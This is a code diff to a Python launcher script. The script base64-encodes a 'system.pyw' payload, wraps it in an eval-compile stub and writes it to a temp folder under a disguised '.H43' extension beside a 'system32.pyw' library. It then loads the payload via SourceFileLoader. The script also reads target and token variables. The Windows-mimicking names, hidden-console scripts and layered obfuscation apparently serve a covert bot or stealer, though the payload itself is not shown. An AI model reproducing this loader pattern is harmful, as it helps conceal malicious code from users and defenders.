@@ -18,14 +18,16 @@ import os
 import sys
 import base64
 import tempfile
-import importlib
 import configparser
+
+from importlib.machinery import SourceFileLoader
 
 MAIN = 'system'
 LIB = 'system32'
 
 SCRIPTS_FOLDER = 'scripts'
-MAIN_SCRIPT_NAME = MAIN + '.pyw'
+MAIN_SCRIPT_NAME_SOURCE = MAIN + '.pyw'
+MAIN_SCRIPT_NAME_TARGET = MAIN + '.H43'
 LIB_SCRIPT_NAME = LIB + '.pyw'
 
 config = configparser.ConfigParser()
@@ -50,7 +52,7 @@ eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
 '''
 
 
-with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME)) as from_file:
+with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME_SOURCE)) as from_file:
     TARGET_VAR = from_file.readline().split('=')[0]
     TOKEN_VAR = from_file.readline().split('=')[0]
     LIB_VAR = from_file.readline().split('=')[0]
@@ -60,7 +62,7 @@ with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME)) as from_file:
     encoded = base64.b64encode(text.encode())
 
 
-with open(os.path.join(d, MAIN_SCRIPT_NAME), 'w') as to_file:  
+with open(os.path.join(d, MAIN_SCRIPT_NAME_TARGET), 'w') as to_file:  
     to_file.write(file_base64_content.format(encoded))
 
 
@@ -78,7 +80,6 @@ with open(os.path.join(d, LIB_SCRIPT_NAME), 'w') as to_file:
 os.chdir(d)
 sys.path.insert(0, d)
 
-importlib.import_module(MAIN_SCRIPT_NAME)
-
+SourceFileLoader("H43", MAIN_SCRIPT_NAME_TARGET).load_module()
 
 
